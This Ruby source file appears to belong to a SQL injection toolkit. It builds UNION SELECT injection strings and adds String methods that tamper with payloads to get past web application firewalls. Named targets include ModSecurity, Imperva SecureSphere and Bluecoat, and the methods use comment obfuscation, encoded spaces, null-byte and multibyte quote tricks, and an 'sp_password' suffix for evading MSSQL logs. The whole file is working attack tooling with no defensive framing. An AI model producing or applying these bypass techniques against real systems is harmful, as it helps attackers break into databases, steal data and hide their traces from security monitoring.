# Basic SQL Statements, Builders, Helpders, Functions or whatever makes life easier....
# This is meant for generic stuff, keep db specific stuff in db specific files if possible...


# Build a basic union query based on the number of columns provided
def union_str(columns)
  foo=[]
  1.upto(columns.to_i) { |num| foo << num.to_i }
  u = "UNION ALL SELECT " + "#{foo.join(',')}"
  return u
end

# Build a basic union query based on the number provided
# Using NULL value for each column value
def union_null_str(columns)
  foo=[]
  1.upto(columns.to_i) { |num| foo << 'NULL' }
  u = "UNION ALL SELECT " + "#{foo.join(',')}"
  return u
end

# Build a basic union query based on the number provided
# Using CUSTOM char for each column values
def union_expand_str(expander, columns)
  foo=[]
  1.upto(columns.to_i) { |num| foo << expander }
  u = "UNION ALL SELECT " + "#{foo.join(',')}"
  return u
end

# Build Union Query taking into account BoF Situation
# Commonly to Bypass 500 Internal Server Error on some WAFs
def union_bof_str(size, columns)
  u = union_str(columns)
  buff = "A" * size.to_i
  bof = " and (select 1)=(select #{buff.mysqlhex})+/*#{u}*/--+-"
end

class String
  # Convert String to HEX Value with '0x' prefix for mysql friendliness
  def mysqlhex
    foo='0x'
    foo += self.each_byte.map { |b| b.to_s(16) }.join
    return foo
  end

  # HEX Decoding of mysql hex '0x'
  def mysqlhexdecode
    self.sub('0x','').scan(/../).map { |x| x.hex.chr }.join
  end

  # MySQL Char() String Converter
  # 'poop'.mysqlchar => CHAR(112, 111, 111, 112)
  def mysqlchar
    foo='CHAR('
    foo += self.asciime + ')'
    return foo
  end

  # MS-SQL Char() String Converter
  # 'poop'.mssqlchar => CHAR(112) + CHAR(111) + CHAR(111) + CHAR(112)
  def mssqlchar
    foo=[]
    self.asciime.split(',').each {|chr| foo << "CHAR(#{chr})" }
    foo.join('+')
  end

  # Oracle CHR() String converter
  # 'poop'.oraclechar => CHR(112) || CHR(111) || CHR(111) || CHR(112)
  def oraclechar
    foo=[]
    self.asciime.split(',').each {|chr| foo << "CHR(#{chr})" }
    foo.join('||')
  end

  # Run wafcap capitlization ONLY on keywords though, not full injection string
  def wafcap_common
    self.gsub(/select/i, "SELECT".wafcap).gsub(/union/i, "UNION".wafcap).gsub(/update/i, "UPDATE".wafcap).gsub(/insert/i, "INSERT".wafcap).gsub(/delete/i, "DELETE".wafcap).gsub(/[, ]concat/i, "CONCAT".wafcap).gsub(/group_concat/i, "GROUP_CONCAT".wafcap).gsub(/information_schema/i, "INFORMATION_SCHEMA".wafcap).gsub(/order/i, "ORDER".wafcap).gsub(/having/i, "HAVING".wafcap).gsub(/between/i, "BETWEEN".wafcap).gsub(/\swhere\s/i, "WHERE".wafcap).gsub(/from/i, "FROM".wafcap).gsub(/like/i, "LIKE".wafcap).gsub(/cast/i, "CAST".wafcap).gsub(/convert/i, "CONVERT".wafcap).gsub(/substring/i, "SUBSTRING".wafcap).gsub(/sleep/i, "SLEEP".wafcap).gsub(/benchmark/i, "BENCHMARK".wafcap)
  end

  # Perce%6et Hex E%6ecode Common SQLi Keywords
  def hex_encode_keywords
    if self =~ /(select)/i
      foo=$1
      newstr = self.gsub(foo, foo.gsub(/e/i, "%#{'e'.hexme}"))
    else
      newstr = self
    end
    if newstr =~ /(update)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/p/i, "%#{'p'.hexme}"))
    end
    if newstr =~ /(insert)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/s/i, "%#{'s'.hexme}"))
    end
    if newstr =~ /(delete)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/l/i, "%#{'l'.hexme}"))
    end
    if newstr =~ /(union)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.gsub(/n/i, "%#{'n'.hexme}"))
    end
    if newstr =~ /[, ](concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.gsub(/c/i, "%#{'c'.hexme}"))
    end
    if newstr =~ /(group_concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.gsub(/o/i, "%#{'o'.hexme}"))
    end
    if newstr =~ /(information_schema)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.gsub(/a/i, "%#{'a'.hexme}"))
    end
    if newstr =~ /(cast)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/t/i, "%#{'t'.hexme}"))
    end
    if newstr =~ /(convert)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/v/i, "%#{'v'.hexme}"))
    end
    if newstr =~ /(substring)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.gsub(/s/i, "%#{'s'.hexme}"))
    end
    if newstr =~ /(sleep)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/p/i, "%#{'p'.hexme}"))
    end
    if newstr =~ /(benchmark)/i
      foo=$1
      newstr = newstr.gsub!(foo, foo.sub(/b/i, "%#{'b'.hexme}"))
    end
    return newstr
  end

  # C Style Commenting of  common keywords in SQLi
  def comment_keywords
    if self =~ /(select)/i
      foo=$1
      newstr = self.gsub(foo, "/*#{foo}*/")
    else
      newstr = self
    end
    if newstr =~ /(update)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(insert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(delete)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(union)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /[, ](concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(group_concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(information_schema)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(cast)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(convert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(substring)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(sleep)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    if newstr =~ /(benchmark)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*#{foo}*/")
    end
    return newstr
  end

  # MySQL C Style Commenting of  common keywords in SQLi
  def mysql_comment_keywords
    if self =~ /(select)/i
      foo=$1
      newstr = self.gsub(foo, "/*!#{foo}*/")
    else
      newstr = self
    end
    if newstr =~ /(update)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(insert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(delete)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(union)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /[, ](concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(group_concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(information_schema)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(cast)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(convert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(substring)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(sleep)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    if newstr =~ /(benchmark)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!#{foo}*/")
    end
    return newstr
  end

  # MySQL C Style Commenting of  common keywords in SQLi
  def mysql_zero_version_comment_keywords
    if self =~ /(select)/i
      foo=$1
      newstr = self.gsub(foo, "/*!0#{foo}*/")
    else
      newstr = self
    end
    if newstr =~ /(update)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(insert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(delete)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(union)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /[, ](concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(group_concat)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(information_schema)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(cast)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(convert)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(substring)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(sleep)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    if newstr =~ /(benchmark)/i
      foo=$1
      newstr = newstr.gsub!(foo, "/*!0#{foo}*/")
    end
    return newstr
  end

  # Add C Style Comments randomly throughout SQLi keywords
  def mysql_random_keywords_comment
    def randomizer(string)
      randstr=String.new
      string.scan(/./) do |char|
        chance=rand(2); 
        if chance.to_i == 0; 
          randstr += char
        else
          randstr += "/*#{char}*/"
        end
      end
      return randstr
    end

    if self =~ /(select)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = self.gsub(foo, bar)
    else
      newstr = self
    end
    if newstr =~ /(update)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(insert)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(delete)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(union)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /[, ](concat)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(group_concat)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(information_schema)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(cast)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(convert)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(substring)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(sleep)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    if newstr =~ /(benchmark)/i
      foo=$1
      bar=randomizer(foo.to_s)
      newstr = newstr.gsub!(foo, bar)
    end
    return newstr
  end

  # Encapsulate string in versioned mysql comment (ModeSecurity Bypass)
  def mysql_modsec_versioned_comment
    if self =~ /(--|\/\*|\#)/
      delim=$1
      inj = self.gsub("#{delim}", '')
    else
      inj=self
    end
    foo="/*!30#{rand(9).to_s+rand(9).to_s+rand(9).to_s}#{inj}*/"
    foo += delim if delim
    return foo
  end

  # Encapsulate string in zero versioned mysql comment (ModeSecurity Bypass)
  def mysql_modsec_zero_version_comment
    if self =~ /(--|\/\*|\#)/
      delim=$1
      inj = self.gsub("#{delim}", '')
    else
      inj=self
    end
    foo="/*!00000#{inj}*/"
    foo += delim if delim
    return foo
  end

  # Place % before each character to evade some weak ASP WAFs
  def percent
    self.scan(/./).join('%')
  end

  # Convert Single Quote to UTF-8 coutnerpart
  def singleq2utf
    self.gsub("'", '%EF%BC%87')
  end

  # Convert Single Quote to illegal double encoded version (leverages null byte)
  def singleq2null
    self.gsub("'", '%00%27')
  end

  # Append Magic String for bypassing Imperva SecureSphere WAF
  def securesphere
    self.gsub(/$/, " and '0having'='0having'")
  end

  # Append NULL Byte to String
  def addnull
    self.gsub(/$/, '%00')
  end

  # Append -- closing comment to end of string
  def adddash
    self.gsub(/$/, '--')
  end

  # Append string based -- - comment to end of string
  def addsdash
    self.gsub(/$/, '-- -')
  end

  # Append # to end of string
  def addhash
    self.gsub(/$/, '#')
  end

  # Append /* comment to end of string
  def addcomm
    self.gsub(/$/, '/*')
  end

  # Append sp_password to String (log avoidance on some mssql instances)
  def addsp
    self.gsub(/$/, 'sp_password')
  end

  # Add blank character following key words to bypass bluecoat default WAF rules
  def bluecoat
    if self =~ /(SELECT)/i
      replace=$1
      newstr=self.gsub(replace, "#{replace}%09")
    else
      newstr=self
    end
    if newstr =~ /(UNION)/i
      replace=$1
      newstr = newstr.gsub!(replace, "#{replace}%09")
    end
    if newstr =~ /(UPDATE)/i
      replace=$1
      newstr = newstr.gsub!(replace, "#{replace}%09")
    end
    if newstr =~ /(INSERT)/i
      replace=$1
      newstr = newstr.gsub!(replace, "#{replace}%09")
    end
    if newstr =~ /(DELETE)/i
      replace=$1
      newstr = newstr.gsub!(replace, "#{replace}%09")
    end
    return newstr
  end

  # Double up on key words to bypass WAFs which remove the inner occurance
  def keywords_doubleup
    if self =~ /(SELECT)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=self.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    else
      newstr=self
    end
    if newstr =~ /(UNION)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=newstr.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    end
    if newstr =~ /[, ](CONCAT)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=newstr.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    end
    if newstr =~ /(UPDATE)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=newstr.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    end
    if newstr =~ /(INSERT)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=newstr.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    end
    if newstr =~ /(DELETE)/i
      replace=$1
      foobar=replace.split(//,2)
      foo=foobar[0]
      bar=foobar[1]
      newstr=newstr.gsub(replace, "#{foo}#{replace.to_s.downcase}#{bar}")
    end
    return newstr
  end

  # Convert '=' to 'LIKE' in all places found
  # Known to bypass some common WAF restrictions
  def equal2like
    cnt=self.scan(/(\s+=\s+)/).count
    if cnt.to_i == 0
      foobar = self
    else
      while cnt.to_i > 0
        if self =~ /(\s+=\s+)/
          foo=$1
          foobar = self.gsub!(foo, ' LIKE ')
        end
        cnt = cnt.to_i - 1
      end
    end
    cnt=self.scan(/(\S+)=(\S+)/).count
    if not cnt.to_i == 0
      while cnt.to_i > 0
        if foobar =~ /(\S+)=(\S+)/
          foo=$1
          bar=$2
          foobar = foobar.gsub!("#{foo}=#{bar}", "#{foo} LIKE #{bar}")
        end
        cnt = cnt.to_i - 1
      end
    end
    return foobar
  end

  # C Style Comment out commas (,) to (/*,*/)
  def comma2comm
    self.gsub(',', '/*,*/')
  end

  def comma2mycomm
  # MySQL Friendly C Style Comment out commas (,) to (/*!,*/)
    self.gsub(',', '/*!,*/')
  end

  def comma2char
  # Add mysql char(44) after each comma (',') in hopes it remains after normal comma stripped by WAF
    self.gsub(',', ',CHAR(44),')
  end

  # Convert commas (union select 1,2,3) to joins (union(select 1)a join (select 2)b join (select 3)c)
  def comma2join
    if self =~ /SELECT (.+,.+)/i
      columns=$1.split(',')
      size=columns.size
      newstr='UNION ALL '
      a=97
      columns.each do |c|
        newstr += "(#{'SELECT'.wafcap} #{c})#{a.to_i.chr}"
        a = a.to_i + 1
        if size.to_i > 1
          newstr += ' join '
        end
        size = size.to_i - 1
      end
    end
    return newstr
  end

  # Convert floor(rand(0)*2) to alternative rand(0) XOR 1
  # So there is NO '*', bypass some protections
  def floor2xor
    self.gsub('floor(rand(0)*2)', 'rANd(0) XoR 1')
  end

  # Convert floor(rand(0)*2) to alternative GREATEST(rand(0),2)
  def floor2greatest
    self.gsub('floor(rand(0)*2)', 'gReATesS(rand(0),2)')
  end

  # Convert floor(rand(0)*2) to alternative rand(0) div 1
  def floor2div
    self.gsub('floor(rand(0)*2)', 'rAnD(0) div 1')
  end

  # Convert floor(rand(0)*2) to alternative ROUND(rand(0),2)
  def floor2round
    self.gsub('floor(rand(0)*2)', 'rOuND(rand(0),2)')
  end

  # Convert floor(rand(0)*2) to alternative double rand (rANd(0) | rAnD(0))
  def floor2rand
    self.gsub('floor(rand(0)*2)', 'rANd(0) | rAnD(0)')
  end

  # Convert greater than '>' queries to use between instead
  def gt2between
    cnt=self.scan(/\s+>\s+/).count
    if cnt.to_i == 0
      foobar = self
    else
      while cnt.to_i > 0
        if self =~ /(\s+>\s+)/
          foo=$1
          foobar = self.gsub!("#{foo}", ' NOT BETWEEN 0 AND ')
        end
        cnt = cnt.to_i - 1
      end
    end
    cnt=self.scan(/(\S+)>(\S+)/).count
    if not cnt.to_i == 0
      while cnt.to_i > 0
        if foobar =~ /(\S+)>(\S+)/
          foo=$1
          bar=$2
          foobar = foobar.gsub!("#{foo}>#{bar}", "#{foo} NOT BETWEEN 0 AND #{bar}")
        end
        cnt = cnt.to_i - 1
      end
    end
    return foobar
  end

  # Convert spaces to comments
  def space2comment
    self.gsub(' ', '/**/')
  end

  # Convert spaces to comments
  def space2mycomment
    self.gsub(' ', '/*!*/')
  end

  # converts spaces to -- dash comments followed by random string and a new line, as seen in ZeroNights
  def space2dash
    newstr=String.new
    self.scan(/./) do |char|
      str="--#{(0...rand(6..12)).map{ ('a'..'z').to_a[rand(26)] }.join}%0A"
      if char == ' '
        newstr += char.sub!(' ', str.wafcap)
      else
        newstr += char
      end
    end
    return newstr
  end

  # converts spaces to dash (--) character followed by a new line
  def space2dashline
    newstr=String.new
    self.scan(/./) do |char|
      str="--%0A"
      if char == ' '
        newstr += char.sub!(' ', str)
      else
        newstr += char
      end
    end
    return newstr
  end

  # converts spaces to hash (#) character followed by random string and a new line, as seen in ModSec SQL  Challenge
  def space2hash
    newstr=String.new
    self.scan(/./) do |char|
      str="%23#{(0...rand(6..12)).map{ ('a'..'z').to_a[rand(26)] }.join}%0A"
      if char == ' '
        newstr += char.sub!(' ', str.wafcap)
      else
        newstr += char
      end
    end
    return newstr
  end

  # converts spaces to hash (#) character followed by a new line
  def space2hashline
    newstr=String.new
    self.scan(/./) do |char|
      str="%23%0A"
      if char == ' '
        newstr += char.sub!(' ', str)
      else
        newstr += char
      end
    end
    return newstr
  end

  # Convert spaces to random new line or blank char characters, 15 possibilities could be chosen from
  # ASCII table:
  #   SOH     01      start of heading
  #   STX     02      start of text
  #   ETX     03      end of text
  #   EOT     04      end of transmission
  #   ENQ     05      enquiry
  #   ACK     06      acknowledge
  #   BEL     07      bell
  #   BS      08      backspace
  #   TAB     09      horizontal tab
  #   LF      0A      new line
  #   VT      0B      vertical TAB
  #   FF      0C      new page
  #   CR      0D      carriage return
  #   SO      0E      shift out
  #   SI      0F      shift in
  def space2mssql
    replacementz=['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A']
    newstr=String.new
    self.scan(/./) do |char|
      replacement=replacementz[rand(15)]
      if char == ' '
        newstr += char.sub!(' ', replacement)
      else
        newstr += char
      end
    end
    return newstr
  end

  # Convert spaces to random new line or blank char characters, 6 possibilities could be chosen from
  # ASCII table:
  #   TAB     09      horizontal TAB
  #   LF      0A      new line
  #   FF      0C      new page
  #   CR      0D      carriage return
  #   VT      0B      vertical TAB
  #   -       A0      -
  def space2mysql
     replacementz=['%09', '%0A', '%0C', '%0D', '%0B', '%A0']
    newstr=String.new
    self.scan(/./) do |char|
      replacement=replacementz[rand(6)]
      if char == ' '
        newstr += char.sub!(' ', replacement)
      else
        newstr += char
      end
    end
    return newstr
  end

  # Convert space to one of the known universal replacements, at random
  # ASCII table:
  #   TAB     09      horizontal TAB
  #   LF      0A      new line
  #   FF      0C      new page
  #   CR      0D      carriage return
  def space2rand
    replacementz=["%09", "%0A", "%0C", "%0D"]
    newstr=String.new
    self.scan(/./) do |char|
      replacement=replacementz[rand(4)]
      if char == ' '
        newstr += char.sub!(' ', replacement)
      else
        newstr += char
      end
    end
    return newstr
  end

  # Convert spaces to new lines
  def space2oa
    self.gsub(' ', '%0A')
  end

  # Convert spaces to horizontal tab
  def space2o9
    self.gsub(' ', '%09')
  end

  # Convert spaces to vertical tab
  def space20b
    self.gsub(' ', '%0B')
  end

  # Convert spaces to new page
  def space20c
    self.gsub(' ', '%0C')
  end

  # Convert spaces to carriage return
  def space20d
    self.gsub(' ', '%0D')
  end

  # Convert spaces to plus symbol
  def space2plus
    self.gsub(' ', '+')
  end

  # Convert Single Quote to multi-byte combo and add dash comment to end to balance
  def unmagicquotes
    self.gsub("'", "%bf%27").addsdash
  end
end
